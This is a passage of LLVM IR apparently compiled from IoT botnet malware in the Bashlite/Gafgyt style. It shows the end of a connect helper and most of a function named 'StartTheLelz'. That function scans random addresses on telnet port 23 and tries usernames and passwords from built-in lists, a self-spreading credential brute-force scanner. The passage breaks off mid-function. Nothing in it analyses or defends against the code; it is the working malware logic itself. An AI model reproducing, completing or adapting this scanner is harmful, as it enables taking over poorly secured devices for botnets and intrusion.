  %13 = bitcast i8* %12 to %struct.hostent*
  store %struct.hostent* %13, %struct.hostent** %6, align 8
  %14 = icmp eq %struct.hostent* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %50

; <label>:16:                                     ; preds = %2
  %17 = load %struct.hostent*, %struct.hostent** %6, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %6, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load i16, i16* %5, align 2
  %29 = call zeroext i16 @htons(i16 zeroext %28) #13
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %31, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %32, i32* %9, align 4
  %33 = load i32, i32* %9, align 4
  %34 = bitcast i32* %8 to i8*
  %35 = call i32 @setsockopt(i32 %33, i32 6, i32 1, i8* %34, i32 4) #2
  %36 = load i32, i32* %9, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %16
  store i32 0, i32* %3, align 4
  br label %50

; <label>:39:                                     ; preds = %16
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %42 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %42, %struct.sockaddr** %41, align 8
  %43 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %44 = load %struct.sockaddr*, %struct.sockaddr** %43, align 8
  %45 = call i32 @connect(i32 %40, %struct.sockaddr* %44, i32 16)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %39
  store i32 0, i32* %3, align 4
  br label %50

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %9, align 4
  store i32 %49, i32* %3, align 4
  br label %50

; <label>:50:                                     ; preds = %48, %47, %38, %15
  %51 = load i32, i32* %3, align 4
  ret i32 %51
}

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @fork() #2
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

; <label>:26:                                     ; preds = %2
  ret void

; <label>:27:                                     ; preds = %2
  %28 = load i32, i32* %4, align 4
  store i32 %28, i32* %11, align 4
  %29 = call i64 @time(i64* null) #2
  %30 = call i32 @rand_cmwc()
  %31 = zext i32 %30 to i64
  %32 = xor i64 %29, %31
  %33 = trunc i64 %32 to i32
  call void @srand(i32 %33) #2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = call noalias i8* @malloc(i64 1025) #2
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1025, i32 1, i1 false)
  %41 = load i32, i32* %11, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  %45 = bitcast %struct.telstate_t* %44 to i8*
  %46 = load i32, i32* %11, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 %48, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %49

; <label>:49:                                     ; preds = %67, %27
  %50 = load i32, i32* %5, align 4
  %51 = load i32, i32* %11, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %70

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 32, i32 16, i1 false)
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  br label %67

; <label>:67:                                     ; preds = %53
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  br label %49

; <label>:70:                                     ; preds = %49
  br label %71

; <label>:71:                                     ; preds = %860, %70
  br label %72

; <label>:72:                                     ; preds = %71
  store i32 0, i32* %5, align 4
  br label %73

; <label>:73:                                     ; preds = %857, %72
  %74 = load i32, i32* %5, align 4
  %75 = load i32, i32* %11, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %860

; <label>:77:                                     ; preds = %73
  %78 = load i32, i32* %5, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 7
  %82 = load i32, i32* %81, align 16
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %91

; <label>:84:                                     ; preds = %77
  %85 = call i64 @time(i64* null) #2
  %86 = trunc i64 %85 to i32
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 7
  store i32 %86, i32* %90, align 16
  br label %91

; <label>:91:                                     ; preds = %84, %77
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 2
  %96 = load i8, i8* %95, align 8
  %97 = zext i8 %96 to i32
  switch i32 %97, label %856 [
    i32 0, label %98
    i32 1, label %237
    i32 2, label %336
    i32 3, label %382
    i32 4, label %427
    i32 5, label %473
    i32 6, label %518
    i32 7, label %618
  ]

; <label>:98:                                     ; preds = %91
  %99 = load i32, i32* %5, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 3
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 1
  br i1 %105, label %106, label %126

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 9
  %111 = load i8*, i8** %110, align 8
  store i8* %111, i8** %20, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %113
  %115 = bitcast %struct.telstate_t* %114 to i8*
  call void @llvm.memset.p0i8.i64(i8* %115, i8 0, i64 32, i32 16, i1 false)
  %116 = load i8*, i8** %20, align 8
  %117 = load i32, i32* %5, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 9
  store i8* %116, i8** %120, align 8
  %121 = call i32 @getDatIP()
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 1
  store i32 %121, i32* %125, align 4
  br label %174

; <label>:126:                                    ; preds = %98
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 3
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %173

; <label>:134:                                    ; preds = %126
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 5
  %139 = load i8, i8* %138, align 1
  %140 = add i8 %139, 1
  store i8 %140, i8* %138, align 1
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 4
  %145 = load i8, i8* %144, align 2
  %146 = add i8 %145, 1
  store i8 %146, i8* %144, align 2
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 5
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 98
  br i1 %153, label %154, label %159

; <label>:154:                                    ; preds = %134
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 3
  store i8 1, i8* %158, align 1
  br label %857

; <label>:159:                                    ; preds = %134
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = zext i8 %164 to i64
  %166 = icmp eq i64 %165, 99
  br i1 %166, label %167, label %172

; <label>:167:                                    ; preds = %159
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 3
  store i8 1, i8* %171, align 1
  br label %857

; <label>:172:                                    ; preds = %159
  br label %173

; <label>:173:                                    ; preds = %172, %126
  br label %174

; <label>:174:                                    ; preds = %173, %106
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext 23) #13
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %176, i16* %177, align 2
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %179 = getelementptr inbounds [8 x i8], [8 x i8]* %178, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %179, i8 0, i64 8, i32 4, i1 false)
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  store i32 %184, i32* %186, align 4
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %188 = load i32, i32* %5, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  store i32 %187, i32* %191, align 16
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = icmp eq i32 %196, -1
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %174
  br label %857

; <label>:199:                                    ; preds = %174
  %200 = load i32, i32* %5, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 16
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %209, i32 3, i8* null)
  %211 = or i32 %210, 2048
  %212 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 4, i32 %211)
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %219 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %218, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %217, %struct.sockaddr* %221, i32 16)
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %232

; <label>:224:                                    ; preds = %199
  %225 = call i32* @__errno_location() #13
  %226 = load i32, i32* %225, align 4
  %227 = icmp ne i32 %226, 115
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %224
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %230
  call void @reset_telstate(%struct.telstate_t* %231)
  br label %236

; <label>:232:                                    ; preds = %224, %199
  %233 = load i32, i32* %5, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %234
  call void @advance_telstate(%struct.telstate_t* %235, i32 1)
  br label %236

; <label>:236:                                    ; preds = %232, %228
  br label %856

; <label>:237:                                    ; preds = %91
  br label %238

; <label>:238:                                    ; preds = %237
  %239 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %240 = getelementptr inbounds [16 x i64], [16 x i64]* %239, i64 0, i64 0
  %241 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %240) #2, !srcloc !6
  %242 = extractvalue { i64, i64* } %241, 0
  %243 = extractvalue { i64, i64* } %241, 1
  %244 = trunc i64 %242 to i32
  store i32 %244, i32* %22, align 4
  %245 = ptrtoint i64* %243 to i64
  %246 = trunc i64 %245 to i32
  store i32 %246, i32* %23, align 4
  br label %247

; <label>:247:                                    ; preds = %238
  br label %248

; <label>:248:                                    ; preds = %247
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 16
  %254 = srem i32 %253, 64
  %255 = zext i32 %254 to i64
  %256 = shl i64 1, %255
  %257 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %258 = load i32, i32* %5, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 16
  %263 = sdiv i32 %262, 64
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [16 x i64], [16 x i64]* %257, i64 0, i64 %264
  %266 = load i64, i64* %265, align 8
  %267 = or i64 %266, %256
  store i64 %267, i64* %265, align 8
  %268 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %268, align 8
  %269 = load i32, i32* %3, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %270, i64* %271, align 8
  %272 = load i32, i32* %5, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %273
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %274, i32 0, i32 0
  %276 = load i32, i32* %275, align 16
  %277 = add nsw i32 %276, 1
  %278 = call i32 @select(i32 %277, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %278, i32* %6, align 4
  %279 = load i32, i32* %6, align 4
  %280 = icmp eq i32 %279, 1
  br i1 %280, label %281, label %313

; <label>:281:                                    ; preds = %248
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %282 = load i32, i32* %5, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = bitcast i32* %15 to i8*
  %288 = call i32 @getsockopt(i32 %286, i32 1, i32 4, i8* %287, i32* %14) #2
  %289 = load i32, i32* %15, align 4
  %290 = icmp ne i32 %289, 0
  br i1 %290, label %291, label %295

; <label>:291:                                    ; preds = %281
  %292 = load i32, i32* %5, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %293
  call void @reset_telstate(%struct.telstate_t* %294)
  br label %312

; <label>:295:                                    ; preds = %281
  %296 = load i32, i32* %5, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = load i32, i32* %5, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = call i32 (i32, i32, ...) @fcntl(i32 %305, i32 3, i8* null)
  %307 = and i32 %306, -2049
  %308 = call i32 (i32, i32, ...) @fcntl(i32 %300, i32 4, i32 %307)
  %309 = load i32, i32* %5, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %310
  call void @advance_telstate(%struct.telstate_t* %311, i32 2)
  br label %312

; <label>:312:                                    ; preds = %295, %291
  br label %857

; <label>:313:                                    ; preds = %248
  %314 = load i32, i32* %6, align 4
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %316, label %320

; <label>:316:                                    ; preds = %313
  %317 = load i32, i32* %5, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %318
  call void @reset_telstate(%struct.telstate_t* %319)
  br label %857

; <label>:320:                                    ; preds = %313
  br label %321

; <label>:321:                                    ; preds = %320
  %322 = load i32, i32* %5, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 7
  %326 = load i32, i32* %325, align 16
  %327 = add i32 %326, 5
  %328 = zext i32 %327 to i64
  %329 = call i64 @time(i64* null) #2
  %330 = icmp slt i64 %328, %329
  br i1 %330, label %331, label %335

; <label>:331:                                    ; preds = %321
  %332 = load i32, i32* %5, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %333
  call void @reset_telstate(%struct.telstate_t* %334)
  br label %335

; <label>:335:                                    ; preds = %331, %321
  br label %856

; <label>:336:                                    ; preds = %91
  %337 = load i32, i32* %5, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = load i32, i32* %3, align 4
  %343 = load i32, i32* %5, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 9
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 @read_until_response(i32 %341, i32 %342, i8* %347, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %349 = icmp ne i32 %348, 0
  br i1 %349, label %350, label %367

; <label>:350:                                    ; preds = %336
  %351 = load i32, i32* %5, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 9
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @contains_fail(i8* %355)
  %357 = icmp ne i32 %356, 0
  br i1 %357, label %358, label %362

; <label>:358:                                    ; preds = %350
  %359 = load i32, i32* %5, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %360
  call void @advance_telstate(%struct.telstate_t* %361, i32 0)
  br label %366

; <label>:362:                                    ; preds = %350
  %363 = load i32, i32* %5, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %364
  call void @advance_telstate(%struct.telstate_t* %365, i32 3)
  br label %366

; <label>:366:                                    ; preds = %362, %358
  br label %857

; <label>:367:                                    ; preds = %336
  %368 = load i32, i32* %5, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %369
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %370, i32 0, i32 7
  %372 = load i32, i32* %371, align 16
  %373 = add i32 %372, 7
  %374 = zext i32 %373 to i64
  %375 = call i64 @time(i64* null) #2
  %376 = icmp slt i64 %374, %375
  br i1 %376, label %377, label %381

; <label>:377:                                    ; preds = %367
  %378 = load i32, i32* %5, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %379
  call void @reset_telstate(%struct.telstate_t* %380)
  br label %381

; <label>:381:                                    ; preds = %377, %367
  br label %856

; <label>:382:                                    ; preds = %91
  %383 = load i32, i32* %5, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 0
  %387 = load i32, i32* %386, align 16
  %388 = load i32, i32* %5, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 4
  %392 = load i8, i8* %391, align 2
  %393 = zext i8 %392 to i64
  %394 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %393
  %395 = load i8*, i8** %394, align 8
  %396 = load i32, i32* %5, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 4
  %400 = load i8, i8* %399, align 2
  %401 = zext i8 %400 to i64
  %402 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %401
  %403 = load i8*, i8** %402, align 8
  %404 = call i64 @strlen(i8* %403) #10
  %405 = call i64 @send(i32 %387, i8* %395, i64 %404, i32 16384)
  %406 = icmp slt i64 %405, 0
  br i1 %406, label %407, label %411

; <label>:407:                                    ; preds = %382
  %408 = load i32, i32* %5, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %409
  call void @reset_telstate(%struct.telstate_t* %410)
  br label %857

; <label>:411:                                    ; preds = %382
  %412 = load i32, i32* %5, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = call i64 @send(i32 %416, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %418 = icmp slt i64 %417, 0
  br i1 %418, label %419, label %423

; <label>:419:                                    ; preds = %411
  %420 = load i32, i32* %5, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %421
  call void @reset_telstate(%struct.telstate_t* %422)
  br label %857

; <label>:423:                                    ; preds = %411
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %425
  call void @advance_telstate(%struct.telstate_t* %426, i32 4)
  br label %856

; <label>:427:                                    ; preds = %91
  %428 = load i32, i32* %5, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 16
  %433 = load i32, i32* %3, align 4
  %434 = load i32, i32* %5, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 9
  %438 = load i8*, i8** %437, align 8
